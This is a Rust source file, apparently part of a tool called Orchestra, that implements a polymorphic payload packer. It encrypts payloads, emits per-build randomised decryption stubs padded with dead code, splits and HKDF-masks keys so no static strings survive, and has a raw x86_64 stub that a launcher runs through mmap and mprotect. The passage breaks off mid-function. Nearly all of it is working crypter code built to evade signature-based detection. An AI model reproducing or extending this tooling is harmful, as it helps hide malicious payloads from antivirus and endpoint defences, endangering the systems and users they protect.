//! Polymorphic payload wrapper for Orchestra's payload-packager.
//!
//! Each call to [`poly_wrap`] randomly selects one of two stream-cipher
//! schemes, generates a fresh key, and encrypts the payload.  The companion
//! [`poly_emit_stub`] function outputs a *structurally unique* Rust source
//! file for the decryption stub: variable names, loop forms, and dead-code
//! blocks are all randomised so each invocation produces a different binary
//! when the stub is compiled into the launcher.
//!
//! # Wire format (`poly_serialize` output)
//!
//! ```text
//! [4 bytes: magic "POLY"]
//! [1 byte:  scheme (0 = AesCtrStream, 2 = ChaCha20Stream, 3 = RawStub)]
//! [4 bytes BE: key_len]
//! [key_len bytes: key]
//! [4 bytes BE: ciphertext_len]
//! [ciphertext_len bytes: ciphertext]
//! ```
//!
//! For scheme 3 (RawStub) the `key` field in the wire format is replaced
//! by the raw x86_64 machine-code stub itself (the stub has the decryption
//! key baked in as RIP-relative data); the launcher detects scheme 3 and
//! executes the stub bytes directly via mmap + mprotect rather than
//! interpreting the key bytes.
//!
//! # Schemes
//!
//! | ID | Name           | Key/stub size | Notes                                            |
//! |----|----------------|---------------|--------------------------------------------------|
//! | 0  | AesCtrStream   | 48 bytes      | AES-256-CTR (32-byte key + 16-byte counter seed) |
//! | 2  | ChaCha20Stream | 44 bytes      | ChaCha20 stream cipher (RFC 8439)                |
//! | 3  | RawStub        | variable      | Per-build x86_64 machine-code decryption stub    |

use crate::stub_emitter::{emit_stub, StubKind};
use hkdf::Hkdf;
use rand::Rng;
use sha2::Sha256;

// ── Encryption scheme ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PolyScheme {
    AesCtrStream   = 0,
    ChaCha20Stream = 2, // Was LfsrStream — replaced due to M-37 8-bit leak
    RawStub        = 3, // M-3: per-build register-allocated machine-code stub
}

impl PolyScheme {
    fn random(rng: &mut impl Rng) -> Self {
        match rng.gen_range(0u8..3) {
            0 => Self::AesCtrStream,
            1 => Self::ChaCha20Stream,
            _ => Self::RawStub,
        }
    }

    pub fn byte(self) -> u8 {
        self as u8
    }
}

// ── Blob ──────────────────────────────────────────────────────────────────────

pub struct PolyBlob {
    pub scheme: PolyScheme,
    /// For AesCtrStream / ChaCha20Stream: the encryption key bytes.
    /// For RawStub: the machine-code stub bytes (key is embedded inside).
    pub key: Vec<u8>,
    pub ciphertext: Vec<u8>,
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Wrap `plaintext` with a randomly-chosen scheme and a fresh random key.
/// Every call produces different ciphertext even for the same input.
pub fn poly_wrap(plaintext: &[u8]) -> PolyBlob {
    let mut rng = rand::thread_rng();
    let scheme = PolyScheme::random(&mut rng);

    match scheme {
        PolyScheme::AesCtrStream => {
            // 48 bytes: 32-byte AES-256 key + 16-byte initial counter block.
            let key: Vec<u8> = (0..48).map(|_| rng.gen()).collect();
            let ct = aes256_ctr_stream(plaintext, &key);
            PolyBlob {
                scheme,
                key,
                ciphertext: ct,
            }
        }
        PolyScheme::ChaCha20Stream => {
            // 44 bytes: 32-byte ChaCha20 key + 12-byte nonce
            let key: Vec<u8> = (0..44).map(|_| rng.gen()).collect();
            let ct = chacha20_stream(plaintext, &key);
            PolyBlob {
                scheme,
                key,
                ciphertext: ct,
            }
        }
        PolyScheme::RawStub => {
            // 44-byte ChaCha20 key (32-byte key + 12-byte nonce).
            // Encrypt the payload with the full ChaCha20 stream cipher so the
            // wire format is not trivially reversible.  The machine-code stub
            // decrypts by XOR-ing with the *pre-computed keystream* embedded in
            // its trailing data — the stub never needs to implement the ChaCha20
            // block function itself; it just XORs ct[i] ^ keystream[i].
            let key_44: Vec<u8> = (0..44).map(|_| rng.gen()).collect();
            let ct = chacha20_stream(plaintext, &key_44);
            // Derive the keystream bytes that the stub will use:
            //   chacha20_stream(zeros, key) == keystream  (XOR with 0 = identity)
            let keystream = chacha20_stream(&vec![0u8; ct.len()], &key_44);
            let seed: u64 = rng.gen();
            // Choose randomly between ChaCha20 and AesCtr stub kind per build.
            let kind = if rng.gen_bool(0.5) { StubKind::ChaCha20 } else { StubKind::AesCtr };
            // Embed the full keystream in the stub; the XOR loop becomes
            // out[i] = ct[i] ^ keystream[i] — correct ChaCha20 decryption.
            let stub = emit_stub(kind, &keystream, seed);
            PolyBlob {
                scheme,
                key: stub.code, // wire format "key" field carries the stub bytes
                ciphertext: ct,
            }
        }
    }
}

/// Serialize a [`PolyBlob`] to the binary wire format documented at the top of
/// this module.
pub fn poly_serialize(blob: &PolyBlob) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + 1 + 4 + blob.key.len() + 4 + blob.ciphertext.len());
    out.extend_from_slice(b"POLY");
    out.push(blob.scheme.byte());
    out.extend_from_slice(&(blob.key.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.key);
    out.extend_from_slice(&(blob.ciphertext.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.ciphertext);
    out
}

/// Emit a unique-per-build Rust source file for the decryption stub.
///
/// The returned string is valid Rust that defines a public function:
///
/// ```rust,ignore
/// pub fn poly_decrypt(ciphertext: &[u8]) -> Vec<u8> { ... }
/// ```
///
/// The function has the key and algorithm hardcoded.  Structural elements
/// (variable names, loop style, dead-code interleavings) are randomised every
/// call so each compiled stub binary has a different binary layout.
pub fn poly_emit_stub(blob: &PolyBlob) -> String {
    // RawStub scheme embeds machine code directly in the wire blob.
    // There is no Rust source to emit — the launcher executes the stub bytes.
    if blob.scheme == PolyScheme::RawStub {
        return format!(
            "// poly_decrypt stub — RawStub scheme (scheme ID 3)\n\
             // The decryption stub is machine code embedded in the wire blob.\n\
             // {} bytes of x86_64 stub code embedded; no Rust source emitted.\n",
            blob.key.len()
        );
    }

    let mut rng = rand::thread_rng();

    // Unique short hex token — makes every generated file visually distinct.
    let build_token: u64 = rng.gen();

    // Pre-generate all random identifiers up-front to avoid closure/borrow conflicts.
    let suf_ct = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_out = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_key = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_dead = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let dead_val: u64 = rng.gen();

    let v_ct = format!("ct_{suf_ct}");
    let v_out = format!("out_{suf_out}");
    let v_key = format!("key_{suf_key}");
    let v_dead = format!("_dead_{suf_dead}");

    // M-38: Avoid embedding the raw key bytes directly in source. Mask the
    // key with an HKDF-SHA256-derived stream and reconstruct it at runtime.
    //
    // M-38b: Further obfuscation — PSK and salt are each split into two halves
    // (psk_a XOR psk_b = psk, salt_a XOR salt_b = salt) so neither literal
    // alone reveals the real value; the stub reconstructs them at runtime via
    // XOR.  The HKDF info string is derived from the per-build build_token
    // (8 LE bytes of the random u64) so every build uses a unique label and
    // the static string "orchestra-poly-key" never appears in generated source.
    let hkdf_psk: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let hkdf_salt: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    // Per-build info derived from build_token — unique per invocation.
    let hkdf_info = build_token.to_le_bytes();
    let hkdf_stream = hkdf_mask_stream(&hkdf_psk, &hkdf_salt, &hkdf_info, blob.key.len());

    let masked_key: Vec<u8> = blob
        .key
        .iter()
        .zip(hkdf_stream.iter())
        .map(|(&b, &m)| b ^ m)
        .collect();
    let masked_key_literal = byte_array_literal(&masked_key);

    // Split PSK: psk_mask XOR psk_b = hkdf_psk
    let psk_mask: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let psk_b: Vec<u8> = hkdf_psk.iter().zip(psk_mask.iter()).map(|(p, m)| p ^ m).collect();
    let psk_a_literal = byte_array_literal(&psk_mask);
    let psk_b_literal = byte_array_literal(&psk_b);

    // Split salt: salt_mask XOR salt_b = hkdf_salt
    let salt_mask: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    let salt_b: Vec<u8> = hkdf_salt.iter().zip(salt_mask.iter()).map(|(s, m)| s ^ m).collect();
    let salt_a_literal = byte_array_literal(&salt_mask);
    let salt_b_literal = byte_array_literal(&salt_b);

    let reconstruct_key_fn = emit_reconstruct_key_fn(
        &masked_key_literal,
        &salt_a_literal,
        &salt_b_literal,
        &psk_a_literal,
        &psk_b_literal,
        build_token,
        &mut rng,
    );

    let body = match blob.scheme {
        PolyScheme::AesCtrStream => emit_aes_ctr_body(&v_ct, &v_key, &v_out, &mut rng),
        PolyScheme::ChaCha20Stream => emit_chacha20_body(&v_ct, &v_key, &v_out, &mut rng),
        PolyScheme::RawStub => unreachable!("RawStub handled above"),
    };

    // Vary whether dead code appears before or after the key assignment.
    let (before_dead, after_dead) = if rng.gen_bool(0.5) {
        (
            format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"),
            String::new(),
        )
    } else {
        (
            String::new(),
            format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"),
        )
    };

    format!(
        "// poly_decrypt stub — generated by payload-packager --poly\n\
         // Build token: {build_token:016x}  scheme: {scheme:?}\n\
         #[allow(unused_variables, unused_mut, clippy::all, non_snake_case)]\n\
         pub fn poly_decrypt({v_ct}: &[u8]) -> ::std::vec::Vec<u8> {{\n\
         {before_dead}\
         {reconstruct_key_fn}\
         {body}\
         {after_dead}\
         }}\n",
        build_token = build_token,
        scheme = blob.scheme,
        reconstruct_key_fn = reconstruct_key_fn,
    )
}

// ── Stream cipher implementations ─────────────────────────────────────────────

const AES_SBOX: [u8; 256] = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
];

#[inline]
fn aes_xtime(x: u8) -> u8 {
    if (x & 0x80) != 0 {
        (x << 1) ^ 0x1b
    } else {
        x << 1
    }
}

#[inline]
fn aes_sub_word(word: u32) -> u32 {
    let [b0, b1, b2, b3] = word.to_be_bytes();
    u32::from_be_bytes([
        AES_SBOX[b0 as usize],
        AES_SBOX[b1 as usize],
        AES_SBOX[b2 as usize],
        AES_SBOX[b3 as usize],
    ])
}

#[inline]
fn aes_rot_word(word: u32) -> u32 {
    word.rotate_left(8)
}

fn aes256_expand_key(key: &[u8; 32]) -> [u32; 60] {
    const RCON: [u8; 8] = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40];

    let mut w = [0u32; 60];
    for i in 0..8 {
        w[i] = u32::from_be_bytes([
            key[i * 4],
            key[i * 4 + 1],
            key[i * 4 + 2],
            key[i * 4 + 3],
        ]);
    }

    for i in 8..60 {
        let mut temp = w[i - 1];
        if i % 8 == 0 {
            temp = aes_sub_word(aes_rot_word(temp)) ^ ((RCON[i / 8] as u32) << 24);
        } else if i % 8 == 4 {
            temp = aes_sub_word(temp);
        }
        w[i] = w[i - 8] ^ temp;
    }

    w
}

#[inline]
fn aes_add_round_key(state: &mut [u8; 16], round_keys: &[u32; 60], round: usize) {
    for col in 0..4 {
        let rk = round_keys[round * 4 + col].to_be_bytes();
        let base = col * 4;
        state[base] ^= rk[0];
        state[base + 1] ^= rk[1];
        state[base + 2] ^= rk[2];
        state[base + 3] ^= rk[3];
    }
}

#[inline]
fn aes_sub_bytes(state: &mut [u8; 16]) {
    for b in state.iter_mut() {
        *b = AES_SBOX[*b as usize];
    }
}

#[inline]
fn aes_shift_rows(state: &mut [u8; 16]) {
    let t1 = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = t1;

    let t2 = state[2];
    let t6 = state[6];
    state[2] = state[10];
    state[6] = state[14];
    state[10] = t2;
    state[14] = t6;

    let t3 = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = t3;
}

#[inline]
fn aes_mix_columns(state: &mut [u8; 16]) {
    for col in 0..4 {
        let base = col * 4;
        let a0 = state[base];
        let a1 = state[base + 1];
        let a2 = state[base + 2];
        let a3 = state[base + 3];
        let t = a0 ^ a1 ^ a2 ^ a3;
        state[base] ^= t ^ aes_xtime(a0 ^ a1);
        state[base + 1] ^= t ^ aes_xtime(a1 ^ a2);
        state[base + 2] ^= t ^ aes_xtime(a2 ^ a3);
        state[base + 3] ^= t ^ aes_xtime(a3 ^ a0);
    }
}

fn aes256_encrypt_block(input: &[u8; 16], round_keys: &[u32; 60]) -> [u8; 16] {
    let mut state = *input;

    aes_add_round_key(&mut state, round_keys, 0);

    for round in 1..14 {
        aes_sub_bytes(&mut state);
        aes_shift_rows(&mut state);
        aes_mix_columns(&mut state);
        aes_add_round_key(&mut state, round_keys, round);
    }

    aes_sub_bytes(&mut state);
    aes_shift_rows(&mut state);
    aes_add_round_key(&mut state, round_keys, 14);

    state
}

#[inline]
fn increment_be_counter(counter: &mut [u8; 16]) {
    for byte in counter.iter_mut().rev() {
        let (next, carry) = byte.overflowing_add(1);
        *byte = next;
        if !carry {
            break;
        }
    }
}

/// Simple XOR-with-cycled-key stream cipher.
/// Retained for internal tooling / test-vector generation; the RawStub wire
/// format now uses `chacha20_stream` so this is no longer on the hot path.
#[allow(dead_code)]
fn xor_keystream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(!key.is_empty(), "xor_keystream: key must not be empty");
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

/// AES-256 in CTR mode.
///
/// Key layout:
/// - bytes 0..31  => AES-256 key
/// - bytes 32..47 => initial 128-bit counter block (zero-padded if shorter)
fn aes256_ctr_stream(data: &[u8], key_material: &[u8]) -> Vec<u8> {
    assert!(
        key_material.len() >= 32,
        "AES-256-CTR requires at least 32 bytes of key material"
    );

    let mut key = [0u8; 32];
    key.copy_from_slice(&key_material[..32]);

    let mut counter = [0u8; 16];
    if key_material.len() >= 48 {
        counter.copy_from_slice(&key_material[32..48]);
    } else {
        let avail = key_material.len().saturating_sub(32).min(16);
        if avail > 0 {
            counter[..avail].copy_from_slice(&key_material[32..32 + avail]);
        }
    }

    let round_keys = aes256_expand_key(&key);
    let mut out = Vec::with_capacity(data.len());

    for chunk in data.chunks(16) {
        let ks = aes256_encrypt_block(&counter, &round_keys);
        for (i, &b) in chunk.iter().enumerate() {
            out.push(b ^ ks[i]);
        }
        increment_be_counter(&mut counter);
    }

    out
}

/// ChaCha20 stream cipher (RFC 8439).
///
/// Replaces the previous LFSR stream cipher (M-37), which leaked 8 bits of
/// state per output byte.  ChaCha20 is a proper stream cipher with no known
/// practical attacks.
///
/// Key: 32 bytes.  Nonce: 12 bytes (bytes 32–43 of `key`, zero-padded if shorter).
fn chacha20_stream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(key.len() >= 32, "ChaCha20 requires at least 32 bytes of key material");

    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(16);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(12);
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(8);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(7);
        (a, b, c, d)
    }

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {
        let mut w = *state;
        for _ in 0..10 {
            let (w0,w4,w8,w12) = qr(w[0],w[4],w[8],w[12]);
            w[0]=w0; w[4]=w4; w[8]=w8; w[12]=w12;
            let (w1,w5,w9,w13) = qr(w[1],w[5],w[9],w[13]);
            w[1]=w1; w[5]=w5; w[9]=w9; w[13]=w13;
            let (w2,w6,w10,w14) = qr(w[2],w[6],w[10],w[14]);
            w[2]=w2; w[6]=w6; w[10]=w10; w[14]=w14;
            let (w3,w7,w11,w15) = qr(w[3],w[7],w[11],w[15]);
            w[3]=w3; w[7]=w7; w[11]=w11; w[15]=w15;
            let (w0,w5,w10,w15) = qr(w[0],w[5],w[10],w[15]);
            w[0]=w0; w[5]=w5; w[10]=w10; w[15]=w15;
            let (w1,w6,w11,w12) = qr(w[1],w[6],w[11],w[12]);
            w[1]=w1; w[6]=w6; w[11]=w11; w[12]=w12;
            let (w2,w7,w8,w13) = qr(w[2],w[7],w[8],w[13]);
            w[2]=w2; w[7]=w7; w[8]=w8; w[13]=w13;
            let (w3,w4,w9,w14) = qr(w[3],w[4],w[9],w[14]);
            w[3]=w3; w[4]=w4; w[9]=w9; w[14]=w14;
        }
        let mut output = [0u8; 64];
        for i in 0..16 {
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }
        output
    }

    let cipher_key = &key[..32];
    let nonce: [u8; 12] = if key.len() >= 44 {
        key[32..44].try_into().unwrap()
    } else {
        let mut n = [0u8; 12];
        let avail = key.len().saturating_sub(32).min(12);
        if avail > 0 {
            n[..avail].copy_from_slice(&key[32..32 + avail]);
        }
        n
    };

    let mut key_words = [0u32; 8];
    for i in 0..8 {
        key_words[i] = u32::from_le_bytes(cipher_key[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];

    let mut output = Vec::with_capacity(data.len());
    let mut counter: u32 = 1; // RFC 8439: counter starts at 1
    let mut keystream_pos = 64usize; // force new block on first byte
    let mut keystream = [0u8; 64];

    for &byte in data {
        if keystream_pos >= 64 {
            let state: [u32; 16] = [
                constants[0], constants[1], constants[2], constants[3],
                key_words[0], key_words[1], key_words[2], key_words[3],
                key_words[4], key_words[5], key_words[6], key_words[7],
                counter, nonce_words[0], nonce_words[1], nonce_words[2],
            ];
            keystream = chacha20_block(&state);
            keystream_pos = 0;
            counter = counter.wrapping_add(1);
        }
        output.push(byte ^ keystream[keystream_pos]);
        keystream_pos += 1;
    }

    output
}

fn hkdf_mask_stream(psk: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> Vec<u8> {
    let hk = Hkdf::<Sha256>::new(Some(salt), psk);
    let mut out = vec![0u8; out_len];
    hk.expand(info, &mut out)
        .expect("HKDF expand failed for key masking");
    out
}

fn emit_reconstruct_key_fn(
    masked_key_lit: &str,
    salt_a_lit: &str,
    salt_b_lit: &str,
    psk_a_lit: &str,
    psk_b_lit: &str,
    build_token: u64,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let v_masked = format!("mk_{}", suf());
    let v_sa = format!("sa_{}", suf());
    let v_sb = format!("sb_{}", suf());
    let v_salt = format!("salt_{}", suf());
    let v_pa = format!("pa_{}", suf());
    let v_pb = format!("pb_{}", suf());
    let v_psk = format!("psk_{}", suf());
    let v_tok = format!("tok_{}", suf());
    let v_info = format!("info_{}", suf());
    let v_hk = format!("hk_{}", suf());
    let v_okm = format!("okm_{}", suf());
    let v_out = format!("rk_{}", suf());
    let v_i = format!("i_{}", suf());

    // PSK / salt reconstruction snippet shared by both branches.
    let setup = format!(
        "let {v_masked}: &[u8] = &[{masked_key_lit}];\n        \
         let {v_sa}: [u8; 16] = [{salt_a_lit}];\n        \
         let {v_sb}: [u8; 16] = [{salt_b_lit}];\n        \
         let {v_salt}: [u8; 16] = ::std::array::from_fn(|i| {v_sa}[i] ^ {v_sb}[i]);\n        \
         let {v_pa}: [u8; 32] = [{psk_a_lit}];\n        \
         let {v_pb}: [u8; 32] = [{psk_b_lit}];\n        \
         let {v_psk}: [u8; 32] = ::std::array::from_fn(|i| {v_pa}[i] ^ {v_pb}[i]);\n        \
         let {v_tok}: u64 = {build_token}u64;\n        \
         let {v_info} = {v_tok}.to_le_bytes();\n        \
         let {v_hk} = ::hkdf::Hkdf::<::sha2::Sha256>::new(Some(&{v_salt}), &{v_psk});\n        \
         let mut {v_okm}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_masked}.len());\n        \
         {v_okm}.resize({v_masked}.len(), 0u8);\n        \
         {v_hk}.expand(&{v_info}, &mut {v_okm})\n            \
             .expect(\"HKDF expand failed in reconstruct_key\");"
    );

    if rng.gen_bool(0.5) {
        format!(
            "    fn reconstruct_key() -> ::std::vec::Vec<u8> {{\n        \
             {setup}\n        \
             let mut {v_out}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_masked}.len());\n        \
             for &{v_i} in {v_masked} {{\n            \
             let idx = {v_out}.len();\n            \
             {v_out}.push({v_i} ^ {v_okm}[idx]);\n        \
             }}\n        \
             {v_out}\n    \
             }}\n"
        )
    } else {
        format!(
            "    fn reconstruct_key() -> ::std::vec::Vec<u8> {{\n        \
             {setup}\n        \
             {v_masked}.iter().enumerate().map(|({v_i}, &b)| {{\n            \
             b ^ {v_okm}[{v_i}]\n        \
             }}).collect()\n    \
             }}\n"
        )
    }
}

// ── Stub body emitters ────────────────────────────────────────────────────────

fn emit_aes_ctr_body(
    v_ct: &str,
    v_key: &str,
    v_out: &str,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let v_sbox = format!("sbox_{}", suf());
    let v_xtime = format!("xt_{}", suf());
    let v_sub_word = format!("sw_{}", suf());
    let v_rot_word = format!("rw_{}", suf());
    let v_expand = format!("ek_{}", suf());
    let v_add_rk = format!("ark_{}", suf());
    let v_sub_bytes = format!("sb_{}", suf());
    let v_shift_rows = format!("sr_{}", suf());
    let v_mix_columns = format!("mc_{}", suf());
    let v_encrypt = format!("enc_{}", suf());
    let v_inc_ctr = format!("inc_{}", suf());
    let v_raw_key = format!("rk_{}", suf());
    let v_ctr = format!("ctr_{}", suf());
    let v_round_keys = format!("rks_{}", suf());
    let v_chunk = format!("ch_{}", suf());
    let v_ks = format!("ks_{}", suf());

    let sbox_literal = byte_array_literal(&AES_SBOX);

    format!(
"    fn {v_xtime}(x: u8) -> u8 {{
        if (x & 0x80) != 0 {{ (x << 1) ^ 0x1b }} else {{ x << 1 }}
    }}
    fn {v_sub_word}(word: u32, {v_sbox}: &[u8; 256]) -> u32 {{
        let [b0, b1, b2, b3] = word.to_be_bytes();
        u32::from_be_bytes([
            {v_sbox}[b0 as usize],
            {v_sbox}[b1 as usize],
            {v_sbox}[b2 as usize],
            {v_sbox}[b3 as usize],
        ])
    }}
    fn {v_rot_word}(word: u32) -> u32 {{ word.rotate_left(8) }}
    fn {v_expand}(key: &[u8; 32], {v_sbox}: &[u8; 256]) -> [u32; 60] {{
        const RCON: [u8; 8] = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40];
        let mut w = [0u32; 60];
        for i in 0..8usize {{
            w[i] = u32::from_be_bytes([key[i*4], key[i*4+1], key[i*4+2], key[i*4+3]]);
        }}
        for i in 8..60usize {{
            let mut t = w[i - 1];
            if i % 8 == 0 {{
                t = {v_sub_word}({v_rot_word}(t), {v_sbox}) ^ ((RCON[i / 8] as u32) << 24);
            }} else if i % 8 == 4 {{
                t = {v_sub_word}(t, {v_sbox});
            }}
            w[i] = w[i - 8] ^ t;
        }}
        w
    }}
    fn {v_add_rk}(state: &mut [u8; 16], rks: &[u32; 60], round: usize) {{
        for col in 0..4usize {{
            let rk = rks[round * 4 + col].to_be_bytes();
            let b = col * 4;
            state[b] ^= rk[0];
            state[b + 1] ^= rk[1];
            state[b + 2] ^= rk[2];
            state[b + 3] ^= rk[3];
        }}
    }}
    fn {v_sub_bytes}(state: &mut [u8; 16], {v_sbox}: &[u8; 256]) {{
        for b in state.iter_mut() {{ *b = {v_sbox}[*b as usize]; }}
    }}
    fn {v_shift_rows}(state: &mut [u8; 16]) {{
        let t1 = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = t1;
        let t2 = state[2]; let t6 = state[6]; state[2] = state[10]; state[6] = state[14]; state[10] = t2; state[14] = t6;
        let t3 = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = t3;
    }}
    fn {v_mix_columns}(state: &mut [u8; 16]) {{
        for col in 0..4usize {{
            let b = col * 4;
            let a0 = state[b];
            let a1 = state[b + 1];
            let a2 = state[b + 2];
            let a3 = state[b + 3];
            let t = a0 ^ a1 ^ a2 ^ a3;
            state[b] ^= t ^ {v_xtime}(a0 ^ a1);
            state[b + 1] ^= t ^ {v_xtime}(a1 ^ a2);
            state[b + 2] ^= t ^ {v_xtime}(a2 ^ a3);
            state[b + 3] ^= t ^ {v_xtime}(a3 ^ a0);
        }}
    }}
    fn {v_encrypt}(input: &[u8; 16], rks: &[u32; 60], {v_sbox}: &[u8; 256]) -> [u8; 16] {{
        let mut st = *input;
        {v_add_rk}(&mut st, rks, 0);
        for round in 1..14usize {{
            {v_sub_bytes}(&mut st, {v_sbox});
            {v_shift_rows}(&mut st);
            {v_mix_columns}(&mut st);
            {v_add_rk}(&mut st, rks, round);
        }}
        {v_sub_bytes}(&mut st, {v_sbox});
        {v_shift_rows}(&mut st);
        {v_add_rk}(&mut st, rks, 14);
        st
    }}
    fn {v_inc_ctr}(ctr: &mut [u8; 16]) {{
        for b in ctr.iter_mut().rev() {{
            let (n, carry) = b.overflowing_add(1);
            *b = n;
            if !carry {{
                break;
            }}
        }}
    }}
    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();
    assert!({v_key}.len() >= 32, \"AES-256-CTR requires at least 32 bytes of key material\");
    let {v_sbox}: [u8; 256] = [{sbox_literal}];
    let mut {v_raw_key}: [u8; 32] = [0; 32];
    {v_raw_key}.copy_from_slice(&{v_key}[..32]);
    let mut {v_ctr}: [u8; 16] = [0; 16];
    if {v_key}.len() >= 48 {{
        {v_ctr}.copy_from_slice(&{v_key}[32..48]);
    }} else {{
        let avail = {v_key}.len().saturating_sub(32).min(16);
        if avail > 0 {{
            {v_ctr}[..avail].copy_from_slice(&{v_key}[32..32 + avail]);
        }}
    }}
    let {v_round_keys}: [u32; 60] = {v_expand}(&{v_raw_key}, &{v_sbox});
    let mut {v_out}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_ct}.len());
    for {v_chunk} in {v_ct}.chunks(16) {{
        let {v_ks}: [u8; 16] = {v_encrypt}(&{v_ctr}, &{v_round_keys}, &{v_sbox});
        for (i, &b) in {v_chunk}.iter().enumerate() {{
            {v_out}.push(b ^ {v_ks}[i]);
        }}
        {v_inc_ctr}(&mut {v_ctr});
    }}
    {v_out}
",
        sbox_literal = sbox_literal,
    )
}

fn emit_chacha20_body(
    v_ct: &str,
    v_key: &str,
    v_out: &str,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let v_qr     = format!("qr_{}",   suf());
    let v_block  = format!("blk_{}",  suf());
    let v_state  = format!("st_{}",   suf());
    let v_work   = format!("w_{}",    suf());
    let v_ctr    = format!("ctr_{}",  suf());
    let v_npos   = format!("npos_{}", suf());
    let v_ks     = format!("ks_{}",   suf());
    let v_b      = format!("b_{}",    suf());
    let v_kwords = format!("kw_{}",   suf());
    let v_nwords = format!("nw_{}",   suf());
    let v_consts = format!("cst_{}",  suf());

